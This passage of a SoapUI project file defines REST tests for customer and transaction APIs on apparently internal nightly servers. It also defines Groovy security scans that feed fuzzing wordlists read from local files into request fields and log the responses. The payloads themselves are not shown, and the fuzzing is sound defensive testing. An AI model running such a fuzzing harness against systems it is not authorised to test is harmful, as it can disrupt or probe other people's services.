context.newJson &lt;&lt; [(KEY): [(context.INDEX): ["request": reqBody, "response": response, "timeTaken": timeTaken.toString(), "parameters": parameterString]]]

//context.jsonData &lt;&lt; [(KEY):["request": reqBody, "response": response, "timeTaken": timeTaken.toString(), "parameters": parameterString]];</scriptText>
              </con:configuration>
            </con:assertion>
            <con:assertion type="GroovyScriptAssertion" id="c18337c6-40b5-4526-b3ef-70bfc7cbb763" name="Customer details not retreived">
              <con:configuration>
                <scriptText>import groovy.json.JsonSlurper;


status = messageExchange.getResponseHeaders().get('status_code')[0]

if(status == "200"){
String response = messageExchange.getResponseContent();
if(response == null){
	response = "null";
}
def json = new JsonSlurper().parseText(response);
assert(json.id == null);	
}</scriptText>
              </con:configuration>
            </con:assertion>
            <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
            <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:parameters label="accountId" parameterName="accountId" xpath="" checked="true"/>
              <con:parameters label="userId" parameterName="user_id" xpath="" checked="true"/>
              <con:parameters label="source" parameterName="source" xpath="" checked="true"/>
            </con:checkedParameters>
            <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:strategy>ONE_BY_ONE</con:strategy>
              <con:delay>100</con:delay>
            </con:executionStrategy>
          </con:testStepSecurityScan>
        </con:testStepSecurityTest>
        <con:properties/>
      </con:securityTest>
    </con:testCase>
    <con:testCase id="3d4dfb03-79a2-46ec-a165-22b2d94c052e" failOnError="true" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="addCustomerAPIs" searchProperties="true">
      <con:settings/>
      <con:testStep type="restrequest" name="addCustomerV1" id="0e351afe-4f14-4fa9-9244-f0a1f3507c4f">
        <con:settings/>
        <con:config service="customer_add" resourcePath="/{version}/customer/add" methodName="Method 1" xsi:type="con:RestRequestStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
          <con:restRequest name="addCustomerV1" id="6b3f46be-1a90-4d61-9862-329d83eba9bd" mediaType="application/json" postQueryString="false">
            <con:settings>
              <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment xmlns:con="http://eviware.com/soapui/config">
  &lt;con:entry key="X-CAP-CLIENT-COUNTRYCODE" value="1"/>
  &lt;con:entry key="Content-Type" value="application/json"/>
&lt;/xml-fragment></con:setting>
            </con:settings>
            <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
            <con:request>{
   "root":{
      "customer":[
         {
            "mobile":"9765764354",
            "email":"9765764354@gmail.com",
            "firstname":"firstname_9765764354",
            "lastname":"lastname_9765764354",
            "gender":"M",
            "subscriptions":{
               "subscription":[
                  {
                     "priority":"TRANS",
                     "scope":"all",
                     "is_subscribed":"0",
                     "channel":"email"
                  },
                  {
                     "priority":"BULK",
                     "scope":"all",
                     "is_subscribed":"0",
                     "channel":"email"
                  },
                  {
                     "priority":"TRANS",
                     "scope":"all",
                     "is_subscribed":"0",
                     "channel":"sms"
                  },
                  {
                     "priority":"BULK",
                     "scope":"all",
                     "is_subscribed":"0",
                     "channel":"sms"
                  }
               ]
            },
            "extended_fields":{
               "field":[
                  {
                     "name":"nationality",
                     "value":"India"
                  },
                  {
                     "name":"zip",
                     "value":"122001"
                  }
               ]
            },
            "custom_fields":{
               "field":[
                  {
                     "name":"Hobbies",
                     "value":"[“Fitness”]"
                  },
                  {
                     "name":"a",
                     "value":"[“b”]"
                  }
               ]
            }
         }
      ]
   }
}</con:request>
            <con:originalUri>https://nightly.capillary.in/v1.1/customer/add</con:originalUri>
            <con:assertion type="Valid HTTP Status Codes" id="6cb8c8e5-1744-4b70-8753-687c12f2c671" name="Valid HTTP Status Codes">
              <con:configuration>
                <codes>200</codes>
              </con:configuration>
            </con:assertion>
            <con:assertion type="GroovyScriptAssertion" id="7d3bafc4-aa3e-437d-a60a-90f967241801" name="get the user id">
              <con:configuration>
                <scriptText>import groovy.json.JsonSlurper;

String response = messageExchange.getResponseContent();
def json = new JsonSlurper().parseText(response);

def user_id = json.response.customers.customer[0].user_id
messageExchange.modelItem.testCase.setPropertyValue('customerId', user_id.toString())</scriptText>
              </con:configuration>
            </con:assertion>
            <con:assertion type="Simple Contains" id="3c38a82f-2950-484d-8338-c33a347b3248" name="response is sucesssful">
              <con:configuration>
                <token>"success":"true"</token>
                <ignoreCase>false</ignoreCase>
                <useRegEx>false</useRegEx>
              </con:configuration>
            </con:assertion>
            <con:credentials>
              <con:username>${#Project#auth_username}</con:username>
              <con:password>${#Project#auth_password}</con:password>
              <con:selectedAuthProfile>Basic</con:selectedAuthProfile>
              <con:addedBasicAuthenticationTypes>Basic</con:addedBasicAuthenticationTypes>
              <con:authType>Global HTTP Settings</con:authType>
            </con:credentials>
            <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
            <con:jmsPropertyConfig/>
            <con:parameters>
              <con:entry key="format" value="json"/>
              <con:entry key="version" value="v1.1"/>
            </con:parameters>
          </con:restRequest>
        </con:config>
      </con:testStep>
      <con:testStep type="restrequest" name="addCustomerV2" id="10a01b4c-1523-4151-8555-820d4edbca2f">
        <con:settings/>
        <con:config service="addCustomerV2" resourcePath="/v2/customers" methodName="Method 1" xsi:type="con:RestRequestStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
          <con:restRequest name="addCustomerV2" id="fd4f6c5f-ee66-46fb-8dd5-295d8bf5ada6" mediaType="application/json" postQueryString="false">
            <con:settings>
              <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting>
            </con:settings>
            <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
            <con:request>{
  "profiles": [{
    "firstName": "Fname_test",
    "lastName": "Lname_test",
    "identifiers": [{
      "type": "mobile",
      "value": "9776864464"
    },{
      "type": "cuid",
      "value": "cuid_9776864464"
    },
    {
      "type": "unionId",
      "value": "unionId_9776864464"
    },
    {
      "type": "email",
      "value": "9776864464@gmail.com"
    },
    {
      "type": "externalId",
      "value": "x9776864464"
    }
   ],
    "commChannels": [{
      "type": "mobile",
      "value": "9776864464",
      "primary": true,
      "verified": true
    }, {
      "type": "email",
      "value": "9776864464@mail.com",
      "primary": true,
      "verified": true
    },{
        "type": "ios",
        "value": "9776864464",
        "primary":true,
        "verified":true
    }],
    "source": "INSTORE",
    "accountId": "-NANE/1"
  }],
  "loyaltyInfo": {
    "loyaltyType": "loyalty"
  },
  "referralCode": ""
}</con:request>
            <con:originalUri>https://crm-nightly-new.cc.capillarytech.com/v2/customers</con:originalUri>
            <con:assertion type="Valid HTTP Status Codes" id="7494be49-1cff-4fd4-8f37-599b7db9ca14" name="status == 201">
              <con:configuration>
                <codes>201</codes>
              </con:configuration>
            </con:assertion>
            <con:assertion type="GroovyScriptAssertion" id="b4161915-7751-4fc3-858e-b257db45bdf0" name="get user id">
              <con:configuration>
                <scriptText>import groovy.json.JsonSlurper;

String response = messageExchange.getResponseContent();
def json = new JsonSlurper().parseText(response);

assert(json.createdId != null)
messageExchange.modelItem.testCase.setPropertyValue("userIdV2",json.createdId.toString());</scriptText>
              </con:configuration>
            </con:assertion>
            <con:credentials>
              <con:username>${#Project#auth_username}</con:username>
              <con:password>${#Project#auth_password}</con:password>
              <con:selectedAuthProfile>Basic</con:selectedAuthProfile>
              <con:addedBasicAuthenticationTypes>Basic</con:addedBasicAuthenticationTypes>
              <con:authType>Global HTTP Settings</con:authType>
            </con:credentials>
            <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
            <con:jmsPropertyConfig/>
            <con:parameters/>
          </con:restRequest>
        </con:config>
      </con:testStep>
      <con:properties>
        <con:property>
          <con:name>userIdV2</con:name>
          <con:value>373405035</con:value>
        </con:property>
        <con:property>
          <con:name>customerId</con:name>
          <con:value>373405745</con:value>
        </con:property>
      </con:properties>
      <con:securityTest id="5484d5ad-5d50-41ab-ab10-1bb6aa5146e4" name="addCustomerFuzzyTests" failOnError="false" failSecurityTestOnScanErrors="true">
        <con:settings/>
        <con:setupScript>import com.eviware.soapui.model.testsuite.TestStepResult.TestStepStatus;

def newJson = []

context.newJson = newJson;
def testSuiteName = context.testCase.testSuite.getLabel();
def testCaseName = context.testCase.getLabel();
def reportPortalTestSuites = context.testCase.testSuite.project.testSuites['ReportPortal'];

String project_dir = context.expand('${projectDir}');
fuzzDBLocation = project_dir + File.separator + "test_data" + File.separator + "fuzzdb";

//Get data from JSON Fuzzing.
def lstOfJsons = []
def lstOfInvalidEmails = []
def lstOfInvalidMobiles = []
def lstOfFuzzString = []

log.info("Reading JSON_fuzzing......")

new File(fuzzDBLocation + File.separator + "JSON_fuzzing.txt").withReader('UTF-8') { reader ->
def line
    while ((line = reader.readLine()) != null) {
        lstOfJsons.add(line)
    }
}
log.info("Reading invalid-emails.......")

new File(fuzzDBLocation + File.separator + "invalid-email-addresses.txt").withReader('UTF-8') { reader ->
def line
    while ((line = reader.readLine()) != null) {
        lstOfInvalidEmails.add(line)
    }
}
log.info("Reading the numeric fuzz data.....")
new File(fuzzDBLocation + File.separator + "numeric.txt").withReader('UTF-8') { reader ->
def line
    while ((line = reader.readLine()) != null) {
        lstOfInvalidMobiles.add(line)
    }
}

log.info("Reading the fuzz strings data.....")
new File(fuzzDBLocation + File.separator + "fuzzString.txt").withReader('UTF-8') { reader ->
def line
    while ((line = reader.readLine()) != null) {
        lstOfFuzzString.add(line)
    }
}



//set to context.
context.lstOfJsons = lstOfJsons
context.lstOfInvalidEmails = lstOfInvalidEmails
context.lstOfInvalidMobiles = lstOfInvalidMobiles
context.lstOfFuzzString = lstOfFuzzString
log.info("Context set!")

/*
//Start a launch.
def startLaunchTestCase = reportPortalTestSuites.testCases['StartLaunch']
startLaunchTestCase.setPropertyValue("launchName", "APIFuzzyTEsts");
def startLaunchRunner = startLaunchTestCase.run(new com.eviware.soapui.support.types.StringToObjectMap(), false);
def stepResults = startLaunchRunner.getResults();
log.info("Lauch Created - " + stepResults[1].getStatus());

//Start a TestSuite.
def startTestSuiteTestCase = reportPortalTestSuites.testCases['StartTestSuite']
startTestSuiteTestCase.setPropertyValue("suiteName", testSuiteName)
def startTestSuiteRunner = startTestSuiteTestCase.run(new com.eviware.soapui.support.types.StringToObjectMap(), false);
def ts_stepResults = startTestSuiteRunner.getResults();
log.info("TestSuite Created - " + ts_stepResults[1].getStatus());

//Start a TestCase.
def startTestCaseTestCase = reportPortalTestSuites.testCases['StartTestCase']
startTestCaseTestCase.setPropertyValue("caseName", testCaseName);
def startTestCaseRunner = startTestCaseTestCase.run(new com.eviware.soapui.support.types.StringToObjectMap(), false);
def tc_stepResults = startTestCaseRunner.getResults();
log.info("TestCase Created - " + tc_stepResults[1].getStatus());

log.info("LaunchID = " + reportPortalTestSuites.getPropertyValue('launchId'));
log.info("SuiteID = " + reportPortalTestSuites.getPropertyValue('suiteId'));
log.info("CaseId = " + reportPortalTestSuites.getPropertyValue('caseId'));
*/</con:setupScript>
        <con:tearDownScript>import groovy.json.JsonOutput;
import com.eviware.soapui.security.*;

String project_dir = context.expand('${projectDir}');
log.info("test name = " + context.testCase.getSecurityTestAt(0).getName())
def result = context.getProperty('SecurityScanRequestResult')

log.info ("Result Type: " + result.getResultType())

log.info("status: " + result.getStatus())

log.info("Messages: " + result.getMessages())

log.info("Actions: "+ result.getActions())

def newJsonStr = JsonOutput.toJson(context.newJson)
def newPrettyJson = JsonOutput.prettyPrint(newJsonStr)

String outputFolder = context.testCase.testSuite.project.getPropertyValue("outputFolder");
String reportFileName = context.testCase.getSecurityTestAt(0).getName();
File reportFileObj = new File(outputFolder + File.separator + reportFileName + ".json");

saveToFile(reportFileObj, newPrettyJson)

//Save the contents to a file
def saveToFile(file, content) {
    if (!file.parentFile.exists()) {
         file.parentFile.mkdirs()
         log.info "Directory did not exist, created"
    }
    file.write(content)
    assert file.exists(), "${file.name} not created"
}

/*
// closing the testcase and suite over reportportal.
def reportPortalTestSuites = context.testCase.testSuite.project.testSuites['ReportPortal'];

def closeTestCase = reportPortalTestSuites.testCases['closeTestCase']
closeTestCase.setPropertyValue("status", "passed");
def closeTestCaseRunner = closeTestCase.run(new com.eviware.soapui.support.types.StringToObjectMap(), false);
def closeTestCaseResults = closeTestCaseRunner.getResults();
log.info("TestCase closed - " + closeTestCaseResults[1].getStatus());

def closeTestSuite = reportPortalTestSuites.testCases['closeTestSuite']
closeTestSuite.setPropertyValue("status", "passed");
def closeTestSuiteRunner = closeTestSuite.run(new com.eviware.soapui.support.types.StringToObjectMap(), false);
def closeTestSuiteRunnerResults = closeTestSuiteRunner.getResults();
log.info("TestSuite closed - " + closeTestSuiteRunnerResults[1].getStatus());

def closeLaunch = reportPortalTestSuites.testCases['closeLaunch']
def closeLaunchRunner = closeLaunch.run(new com.eviware.soapui.support.types.StringToObjectMap(), false);
def closeLaunchRunnerResults = closeLaunchRunner.getResults();
log.info("Launch Closed - " + closeLaunchRunnerResults[1].getStatus());
*/</con:tearDownScript>
        <con:testStepSecurityTest>
          <con:testStepId>0e351afe-4f14-4fa9-9244-f0a1f3507c4f</con:testStepId>
          <con:testStepSecurityScan type="GroovySecurityScan" name="Custom Script" id="a75d91d5-a9b2-42ef-b444-0d51570a12b0" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
            <con:settings/>
            <con:config xsi:type="con:GroovySecurityScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:executeScript>import groovy.json.JsonSlurper;
import groovy.json.JsonBuilder;

def req = testStep.getPropertyValue("Request")

def requestJson = new JsonSlurper().parseText(req);

int jsonFuzzMaxIndex = context.lstOfJsons.size -1;

int invalidEmailsMaxIndex = context.lstOfInvalidEmails.size -1;

int invalidMobilesMaxIndex = context.lstOfInvalidMobiles.size - 1;

if(context.jsonFuzzIndex == null){
	context.jsonFuzzIndex = 0
}
if(context.invalidEmailFuzzIndex == null){
	context.invalidEmailFuzzIndex = 0
}
if(context.lstOfInvalidMobilesIndex == null){
context.lstOfInvalidMobilesIndex = 0;
}

JsonBuilder builder = new JsonBuilder(requestJson)

// modify the request body with fuzzy json data.
if(context.jsonFuzzIndex &lt;= jsonFuzzMaxIndex){
	log.info("Content at index - " + context.jsonFuzzIndex + "==> " + context.lstOfJsons.get(context.jsonFuzzIndex))
	builder.content = context.lstOfJsons.get(context.jsonFuzzIndex)
	parameters.payload = builder.toString();
	log.info("Payload set -- " + parameters.payload)
	context.changedParamsField = "json body"
	context.changedParamsValue =  context.lstOfJsons.get(context.jsonFuzzIndex)
     context.status = securityScan.getSecurityScanResult().getStatusString()
	context.jsonFuzzIndex++
	return true
}
//modify the email param in request body with invalid emails.
else if(context.invalidEmailFuzzIndex &lt;= invalidEmailsMaxIndex){
	log.info("Content at index - " + context.invalidEmailFuzzIndex + "==> " + context.lstOfInvalidEmails.get(context.invalidEmailFuzzIndex))
	String timestamp = System.currentTimeMillis().toString();
	mobile = "91" + timestamp.substring(3);
	builder.content.root.customer[0].mobile = mobile;
	builder.content.root.customer[0].email = context.lstOfInvalidEmails.get(context.invalidEmailFuzzIndex)
	parameters.payload = builder.toString()
	log.info("Payload set -- " + parameters.payload)
	context.changedParamsField = "customer.email"
	context.changedParamsValue =  context.lstOfInvalidEmails.get(context.invalidEmailFuzzIndex)
	context.status = securityScan.getSecurityScanResult().getStatusString()
	context.invalidEmailFuzzIndex++
	return true
}
// modify the mobile in request body with invalid mobiles.
else if(context.lstOfInvalidMobilesIndex &lt;= invalidMobilesMaxIndex){
log.info("Content at index - " + context.lstOfInvalidMobilesIndex + "==> " + context.lstOfInvalidMobiles.get(context.lstOfInvalidMobilesIndex))
builder.content.root.customer[0].mobile = context.lstOfInvalidMobiles.get(context.lstOfInvalidMobilesIndex)
parameters.payload = builder.toString()
log.info("Payload set -- " + parameters.payload)
context.changedParamsField = "customer.mobile"
context.changedParamsValue =  context.lstOfInvalidMobiles.get(context.lstOfInvalidMobilesIndex)
context.status = securityScan.getSecurityScanResult().getStatusString()
context.lstOfInvalidMobilesIndex++
return true
}
else{
	return false
}</con:executeScript>
            </con:config>
            <con:assertion type="Sensitive Information Exposure" id="00e0d0e7-10b0-47fb-948d-89b858a8b5c1" name="Sensitive Information Exposure">
              <con:configuration>
                <IncludeProjectSpecific>true</IncludeProjectSpecific>
                <IncludeGlobal>true</IncludeGlobal>
              </con:configuration>
            </con:assertion>
            <con:assertion type="GroovyScriptAssertion" id="3c2db73d-c634-46d8-8f2f-689e67ac8c73" name="capture request data">
              <con:configuration>
                <scriptText>String response = messageExchange.getResponseContent();
String reqBody = messageExchange.getRequestContent();
String endPoint = messageExchange.getEndpoint()

HashMap&lt;String,String> properties = messageExchange.getProperties()
def parameterJson = [:]
properties.each{ key,value ->
  parameterJson[(key)] = value;
  }
parameterString = parameterJson.toMapString()
//log.info("params -- " + parameterString);
//String changedParams = messageExchange.getProperty("SecurityChangedParameters");
def timeTaken = messageExchange.getTimeTaken();
def testStepName = context.testCase.getTestStepAt(context.getCurrentStepIndex()).getLabel();
def securityTestName = context.getCurrentScan().getParent().getName();
def scan = context.getCurrentScan().getName();

if(context.INDEX == null){
	context.INDEX = 0;
	//context.stepData = [];
}
context.INDEX = context.INDEX + 1;

KEY = securityTestName + "_" + testStepName + "_" + scan //+ "_" + System.currentTimeMillis().toString();

stepMessage = ["request": reqBody, "response": response, "timeTaken": timeTaken.toString(), "parameters": parameterString, "changedFieldKey": context.changedParamsField, "changedFieldValue": context.changedParamsValue]

context.newJson &lt;&lt; [(KEY): [(context.INDEX): ["request": reqBody, "response": response, "timeTaken": timeTaken.toString(), "parameters": parameterString, "changedFieldKey": context.changedParamsField, "changedFieldValue": context.changedParamsValue, "status": context.status]]]

//context.jsonData &lt;&lt; [(KEY):["request": reqBody, "response": response, "timeTaken": timeTaken.toString(), "parameters": parameterString]];</scriptText>
              </con:configuration>
            </con:assertion>
            <con:assertion type="GroovyScriptAssertion" id="0673a3e1-1381-42d3-91bf-3e6a6e9d9382" name="Success not true">
              <con:configuration>
                <scriptText>import groovy.json.JsonSlurper;

String response = messageExchange.getResponseContent();
def json = new JsonSlurper().parseText(response);

status = messageExchange.getResponseHeaders().get('#status#')
code = (status =~ "[1-5]\\d\\d")[0]


if(code == "200"){
	String success = json.response.status.success
	assert(success != "true")
}</scriptText>
              </con:configuration>
            </con:assertion>
            <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
            <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:parameters label="payload" parameterName="Request" xpath="" checked="true"/>
            </con:checkedParameters>
            <con:executionStrategy xsi:nil="true" immutable="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:strategy>ONE_BY_ONE</con:strategy>
              <con:delay>100</con:delay>
            </con:executionStrategy>
          </con:testStepSecurityScan>
        </con:testStepSecurityTest>
        <con:testStepSecurityTest>
          <con:testStepId>10a01b4c-1523-4151-8555-820d4edbca2f</con:testStepId>
          <con:testStepSecurityScan type="GroovySecurityScan" name="Custom Script" id="7290ea3d-d871-44e8-b147-db8c4b5cbbe6" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
            <con:settings/>
            <con:config xsi:type="con:GroovySecurityScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:executeScript>import groovy.json.JsonSlurper;
import groovy.json.JsonBuilder;

def req = testStep.getPropertyValue("Request")

def requestJson = new JsonSlurper().parseText(req);

int jsonFuzzMaxIndex = context.lstOfJsons.size -1;

int invalidEmailsMaxIndex = context.lstOfInvalidEmails.size -1;

int invalidMobilesMaxIndex = context.lstOfInvalidMobiles.size - 1;

int fuzzStringsMaxIndex = context.lstOfFuzzString.size - 1;

int numericFuzzMaxIndex = context.lstOfInvalidMobiles.size - 1;

if(context.jsonFuzzIndex == null){
	context.jsonFuzzIndex = 0
}
if(context.invalidEmailFuzzIndex == null){
	context.invalidEmailFuzzIndex = 0
}
if(context.lstOfInvalidMobilesIndex == null){
context.lstOfInvalidMobilesIndex = 0;
}
if(context.fuzzStringsIndex == null){
  context.fuzzStringsIndex = 0;
}
if(context.numericFuzzIndex == null){
  context.numericFuzzIndex = 0;
}

JsonBuilder builder = new JsonBuilder(requestJson)

// modify the request body with fuzzy json data.
if(context.jsonFuzzIndex &lt;= jsonFuzzMaxIndex){
	log.info("Content at index - " + context.jsonFuzzIndex + "==> " + context.lstOfJsons.get(context.jsonFuzzIndex))
	builder.content = context.lstOfJsons.get(context.jsonFuzzIndex)
	parameters.payload = builder.toString();
	log.info("Payload set -- " + parameters.payload)
	context.changedParamsField = "json body"
	context.changedParamsValue =  context.lstOfJsons.get(context.jsonFuzzIndex)
  context.status = securityScan.getSecurityScanResult().getStatusString()
	context.jsonFuzzIndex++
	return true
}
//modify the email param in request body with invalid emails.
else if(context.invalidEmailFuzzIndex &lt;= invalidEmailsMaxIndex){
	log.info("Content at index - " + context.invalidEmailFuzzIndex + "==> " + context.lstOfInvalidEmails.get(context.invalidEmailFuzzIndex))
  String timestamp = System.currentTimeMillis().toString();
  String mobile = "91" + timestamp.substring(3);
  builder.content.profiles[0].identifiers[0].value = mobile;
	builder.content.profiles[0].identifiers[3].value = context.lstOfInvalidEmails.get(context.invalidEmailFuzzIndex)
	parameters.payload = builder.toString()
	log.info("Payload set -- " + parameters.payload)
	context.changedParamsField = "identifier.email"
	context.changedParamsValue =  context.lstOfInvalidEmails.get(context.invalidEmailFuzzIndex)
  context.status = securityScan.getSecurityScanResult().getStatusString()
	context.invalidEmailFuzzIndex++
	return true;
}
// modify the mobile in request body with invalid mobiles.
else if(context.lstOfInvalidMobilesIndex &lt;= invalidMobilesMaxIndex){
	log.info("Content at index - " + context.lstOfInvalidMobilesIndex + "==> " + context.lstOfInvalidMobiles.get(context.lstOfInvalidMobilesIndex))
	builder.content.profiles[0].identifiers[0].value = context.lstOfInvalidMobiles.get(context.lstOfInvalidMobilesIndex)
	parameters.payload = builder.toString()
	log.info("Payload set -- " + parameters.payload)
	context.changedParamsField = "identifier.mobile"
	context.changedParamsValue =  context.lstOfInvalidMobiles.get(context.lstOfInvalidMobilesIndex)
	context.status = securityScan.getSecurityScanResult().getStatusString()
	context.lstOfInvalidMobilesIndex++
	return true;
}
//modify the source with fuzz strings.
else if(context.fuzzStringsIndex &lt;= fuzzStringsMaxIndex){
  log.info("Content at index - " + context.fuzzStringsIndex + "==> " + context.lstOfFuzzString.get(context.fuzzStringsIndex))
  builder.content.profiles[0].source = context.lstOfFuzzString.get(context.fuzzStringsIndex)
  parameters.payload = builder.toString()
  log.info("Payload set -- " + parameters.payload)
  context.changedParamsField = "profile.source"
  context.changedParamsValue =  context.lstOfFuzzString.get(context.fuzzStringsIndex)
  context.status = securityScan.getSecurityScanResult().getStatusString()
  context.fuzzStringsIndex++;
  return true;
}
//modify the accountId with fuzz strings.
else if(context.numericFuzzIndex &lt;= numericFuzzMaxIndex){
  log.info("Content at index - " + context.numericFuzzIndex + "==> " + context.lstOfInvalidMobiles.get(context.numericFuzzIndex))
  builder.content.profiles[0].accountId = context.lstOfInvalidMobiles.get(context.numericFuzzIndex)
  parameters.payload = builder.toString()
  log.info("Payload set -- " + parameters.payload)
  context.changedParamsField = "profile.accountId"
  context.changedParamsValue =  context.lstOfInvalidMobiles.get(context.numericFuzzIndex)
  context.status = securityScan.getSecurityScanResult().getStatusString()
  context.numericFuzzIndex++;
  return true;
}
else{
	return false;
}</con:executeScript>
            </con:config>
            <con:assertion type="Sensitive Information Exposure" id="b3ba98b7-c60e-4bfb-9eec-a7f1fe284956" name="Sensitive Information Exposure">
              <con:configuration>
                <IncludeProjectSpecific>true</IncludeProjectSpecific>
                <IncludeGlobal>true</IncludeGlobal>
              </con:configuration>
            </con:assertion>
            <con:assertion type="GroovyScriptAssertion" id="e9d109f3-f305-4a4a-ad91-bbe9647241e5" name="capture request data">
              <con:configuration>
                <scriptText>String response = messageExchange.getResponseContent();
String reqBody = messageExchange.getRequestContent();
String endPoint = messageExchange.getEndpoint()

HashMap&lt;String,String> properties = messageExchange.getProperties()
def parameterJson = [:]
properties.each{ key,value ->
  parameterJson[(key)] = value;
  }
parameterString = parameterJson.toMapString()
//log.info("params -- " + parameterString);
//String changedParams = messageExchange.getProperty("SecurityChangedParameters");
def timeTaken = messageExchange.getTimeTaken();
def testStepName = context.testCase.getTestStepAt(context.getCurrentStepIndex()).getLabel();
def securityTestName = context.getCurrentScan().getParent().getName();
def scan = context.getCurrentScan().getName();

if(context.INDEX == null){
	context.INDEX = 0;
	//context.stepData = [];
}
context.INDEX = context.INDEX + 1;

KEY = securityTestName + "_" + testStepName + "_" + scan //+ "_" + System.currentTimeMillis().toString();

stepMessage = ["request": reqBody, "response": response, "timeTaken": timeTaken.toString(), "parameters": parameterString, "changedFieldKey": context.changedParamsField, "changedFieldValue": context.changedParamsValue]

context.newJson &lt;&lt; [(KEY): [(context.INDEX): ["request": reqBody, "response": response, "timeTaken": timeTaken.toString(), "parameters": parameterString, "changedFieldKey": context.changedParamsField, "changedFieldValue": context.changedParamsValue, "status": context.status]]]

//context.jsonData &lt;&lt; [(KEY):["request": reqBody, "response": response, "timeTaken": timeTaken.toString(), "parameters": parameterString]];</scriptText>
              </con:configuration>
            </con:assertion>
            <con:assertion type="GroovyScriptAssertion" id="2378dea9-3fe6-4c33-9573-d8f277f7003c" name="customer not added">
              <con:configuration>
                <scriptText>import groovy.json.JsonSlurper;

String response = messageExchange.getResponseContent();
if(response == null){
	response = "null";
}
def json = new JsonSlurper().parseText(response);

status = messageExchange.getResponseHeaders().get('#status#')
code = (status =~ "[1-5]\\d\\d")[0]


if(code == "200" || code == "201"){
assert(json.createdId != null)
}</scriptText>
              </con:configuration>
            </con:assertion>
            <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
            <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:parameters label="payload" parameterName="Request" xpath="" checked="true"/>
            </con:checkedParameters>
            <con:executionStrategy xsi:nil="true" immutable="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:strategy>ONE_BY_ONE</con:strategy>
              <con:delay>100</con:delay>
            </con:executionStrategy>
          </con:testStepSecurityScan>
        </con:testStepSecurityTest>
        <con:properties/>
      </con:securityTest>
    </con:testCase>
    <con:properties/>
  </con:testSuite>
  <con:testSuite id="519e7e96-118b-4ff0-b93a-9ebf8d7ee4dd" name="TransactionAPIFuzzyTestSuite">
    <con:settings/>
    <con:runType>SEQUENTIAL</con:runType>
    <con:testCase id="0fd0ae6c-c814-46a4-aa34-74849b119c46" failOnError="true" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="getTransactionAPI" searchProperties="true">
      <con:settings/>
      <con:testStep type="restrequest" name="getTransactionV1" id="ceac7917-827b-4c43-aba7-0df57d4bc4a7">
        <con:settings/>
        <con:config service="getTransactionV1" resourcePath="/{version}/transaction/get" methodName="Method 1" xsi:type="con:RestRequestStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
          <con:restRequest name="getTransactionV1" id="f1ce8a1c-c340-46c3-aa19-9dec4fe686b5" mediaType="application/json">
            <con:settings>
              <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting>
            </con:settings>
            <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
            <con:request/>
            <con:originalUri>https://crm-nightly-new.cc.capillarytech.com/version/transaction/get</con:originalUri>
            <con:assertion type="Simple Contains" id="68d6e413-c416-449b-98d2-b44ee518be16" name="sucess == true">
              <con:configuration>
                <token>"success":"true"</token>
                <ignoreCase>false</ignoreCase>
                <useRegEx>false</useRegEx>
              </con:configuration>
            </con:assertion>
            <con:credentials>
              <con:username>${#Project#auth_username}</con:username>
              <con:password>${#Project#auth_password}</con:password>
              <con:selectedAuthProfile>Basic</con:selectedAuthProfile>
              <con:addedBasicAuthenticationTypes>Basic</con:addedBasicAuthenticationTypes>
              <con:authType>Global HTTP Settings</con:authType>
            </con:credentials>
            <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
            <con:jmsPropertyConfig/>
            <con:parameters>
              <con:entry key="tenders" value="false"/>
              <con:entry key="id" value="2147547097"/>
              <con:entry key="version" value="v1.1"/>
            </con:parameters>
          </con:restRequest>
        </con:config>
      </con:testStep>
      <con:properties/>
      <con:securityTest id="6a5cc651-835f-44ef-957e-5b74bb9682a5" name="getTransactionFuzzyTests" failOnError="false" failSecurityTestOnScanErrors="true">
        <con:settings/>
        <con:setupScript>import com.eviware.soapui.model.testsuite.TestStepResult.TestStepStatus;

def newJson = []

context.newJson = newJson;
def testSuiteName = context.testCase.testSuite.getLabel();
def testCaseName = context.testCase.getLabel();
def reportPortalTestSuites = context.testCase.testSuite.project.testSuites['ReportPortal'];

String project_dir = context.expand('${projectDir}');
fuzzDBLocation = project_dir + File.separator + "test_data" + File.separator + "fuzzdb";

//Get data from JSON Fuzzing.
def lstOfJsons = []
def lstOfInvalidEmails = []
def lstOfInvalidMobiles = []
def lstOfFuzzString = []

log.info("Reading JSON_fuzzing......")

new File(fuzzDBLocation + File.separator + "JSON_fuzzing.txt").withReader('UTF-8') { reader ->
def line
    while ((line = reader.readLine()) != null) {
        lstOfJsons.add(line)
    }
}
log.info("Reading invalid-emails.......")

new File(fuzzDBLocation + File.separator + "invalid-email-addresses.txt").withReader('UTF-8') { reader ->
def line
    while ((line = reader.readLine()) != null) {
        lstOfInvalidEmails.add(line)
    }
}
log.info("Reading the numeric fuzz data.....")
